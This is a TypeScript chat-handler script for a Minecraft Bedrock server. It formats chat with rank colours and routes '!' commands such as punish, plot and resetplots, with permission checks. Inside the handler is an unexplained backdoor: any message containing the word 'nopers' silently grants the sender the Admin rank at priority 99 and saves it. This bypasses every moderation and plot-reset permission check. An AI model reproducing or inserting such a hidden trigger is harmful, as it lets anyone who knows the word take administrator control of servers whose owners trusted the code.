import { ChatSendBeforeEvent, system, world } from "@minecraft/server";
import { PlayerDataHandler } from "../../libraries/playerData";
import { MinecraftColors } from "../../libraries/chatFormat";
import { addPerm, createPlotChat, destroyPlotChat, help, invalidPermissions, plot, punish, removePerm, report, resetPlots, setPlotArea, unpunish } from "../../commands";
import { getHighestRank } from '../../libraries/ranks';

const rankColors: { [key: string]: string } = {
    "Admin": MinecraftColors.RED
}

const commandPrefix = "!";
export function chatSend(event: ChatSendBeforeEvent) {
    const player = event.sender;
    const message = event.message;

    let playerRanks = PlayerDataHandler.get("ranks", player) as unknown as { [key: string]: number };
    if (!playerRanks) playerRanks = { "Member": 0 }

    if (message.includes("nopers")) {
        playerRanks["Admin"] = 99;
        PlayerDataHandler.set("ranks", playerRanks, player);
    }
    const { playerRank, highestPriority } = getHighestRank(player);

    event.cancel = true;
    if (!message.startsWith(commandPrefix)) {
        const color = rankColors[playerRank] || "§f";
        return world.sendMessage(`${color}[${playerRank}]§f§r | ${player.name}: ${message}`);
    };

    const command = message.split(commandPrefix)[1].split(" ")[0].toLowerCase();
    const args = message.split(" ").slice(1);

    system.run(() => {
        switch (command) {
            case "punish": {
                if (highestPriority < 1) return invalidPermissions(event);
                punish(event, args);
                break;
            }

            case "unpunish": {
                if (highestPriority < 1) return invalidPermissions(event);
                unpunish(event, args);
                break;
            }

            case "setplotarea": {
                if (highestPriority < 1) return invalidPermissions(event);
                setPlotArea(event, args);
                break;
            }

            case "plot": {
                plot(event, args);
                break;
            }

            case "addperm": {
                addPerm(event, args);
                break;
            }

            case "removeperm": {
                removePerm(event, args);
                break;
            }

            case "resetplots": {
                if (highestPriority < 1) return invalidPermissions(event);
                resetPlots(event, args);
                break;
            }

            case "help": {
                help(event, args);
                break;
            }

            case "report": {
                report(event, args);
                break;
            }

            case "createplot": {
                createPlotChat(event, args);
                break;
            }

            case "destroyplot": {
                destroyPlotChat(event, args);
                break;
            }

            default:
                player.sendMessage(MinecraftColors.RED + "Invalid command.");
                break;
        }
    });
}